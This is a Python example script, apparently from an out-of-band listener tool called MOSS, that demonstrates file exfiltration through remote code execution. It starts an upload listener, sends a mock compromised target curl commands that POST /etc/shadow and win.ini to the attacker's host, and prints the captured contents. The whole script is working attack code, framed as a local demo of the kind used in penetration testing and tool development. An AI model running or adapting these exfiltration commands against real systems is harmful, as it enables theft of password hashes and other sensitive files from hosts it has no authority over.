"""
RCE curl file exfiltration — uses file extension to capture files
sent via curl from a compromised target.

When --target is given, sends curl commands to a mock RCE server
that executes them via os.system (see mock_rce_target.py).

Usage (terminal 1 — mock compromised target):
    python examples/mock_rce_target.py 9000

Usage (terminal 2 — attacker):
    python examples/rce_curl.py --hostname localhost --target http://localhost:9000
"""

import sys
import os
import argparse

import httpx

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from moss.moss import MossBuilder


FILES = ["/etc/shadow", "C:\\Windows\\win.ini"]


def send_curl_cmd(target_url, curl_cmd):
    """POST a curl command to the mock RCE target for execution."""
    try:
        r = httpx.post(target_url, content=curl_cmd, timeout=15)
        print(f"  -> sent to target (exit {r.text.strip()})")
    except Exception as e:
        print(f"  -> FAILED: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="RCE curl file exfiltration via MOSS file extension",
    )
    parser.add_argument("--hostname", default="localhost",
                        help="Public hostname reachable from the target")
    parser.add_argument("--port", type=int, default=8000,
                        help="MOSS listen port")
    parser.add_argument("--timeout", type=int, default=10,
                        help="Seconds to wait for exfiltrated files")
    parser.add_argument("--target", required=True,
                        help="Mock RCE target URL — sends curl commands here for execution")
    args = parser.parse_args()

    # Step 1 ── Start MOSS with file extension in memory mode ────────────
    builder = MossBuilder(args=[
        "-p", str(args.port),
        "--hostname", args.hostname,
        "-e", "file",
        "-d", "[[memory]]",
        "--filter", "upload",
    ])
    runner = builder.api()
    server = runner.servers[0]

    print(f"OOB listener on http://{args.hostname}:{args.port}")
    print(f"Upload endpoint: http://{args.hostname}:{args.port}/upload")
    print()

    runner.serve()

    # Step 2 ── Send curl commands to target via --target ───────────────
    origin = f"http://{args.hostname}:{args.port}"

    print(f"Sending curl commands to mock target at {args.target}")
    print()
    for f in FILES:
        fname = os.path.basename(f)
        curl_cmd = (
            f'curl.exe -X POST --data-binary "@{f}" '
            f'"{origin}/upload" '
            f'-H "X-File-Name: {fname}"'
        )
        print(f"  curl: {f}")
        send_curl_cmd(args.target, curl_cmd)
    print()

    # Step 3 ── Wait for uploaded files ─────────────────────────────────
    print(f"Waiting {args.timeout}s for files...")
    while (evt := server.wait(args.timeout)) is not None:
        path = evt.get("path", "")
        if path.rstrip("/") == "/upload" and evt.get("method") == "POST":
            fname = evt.get("headers", {}).get("X-File-Name", "unnamed")
            print(f"  <- upload received: {fname}")

    print()

    # Step 4 ── List captured files ─────────────────────────────────────
    print("--- Captured files ---")
    bp = server.fileserver_url_path.rstrip('/')
    uploaded = [(k, v) for k, v in server.files.items() if k.startswith(bp + '/')]
    if uploaded:
        for key, (mime, content) in sorted(uploaded):
            fname = key[len(bp) + 1:]
            size = len(content) if content else 0
            print(f"\n  {fname}  ({size} bytes)")
            if content and size <= 4096:
                text = content.decode("utf-8", errors="replace")
                print(f"  {'─' * 60}")
                for line in text.splitlines()[:20]:
                    print(f"  {line}")
                if len(text.splitlines()) > 20:
                    print(f"  ... ({len(text.splitlines()) - 20} more lines)")
                print(f"  {'─' * 60}")
    else:
        print("  (no files captured)")

    runner.shutdown()


if __name__ == "__main__":
    main()
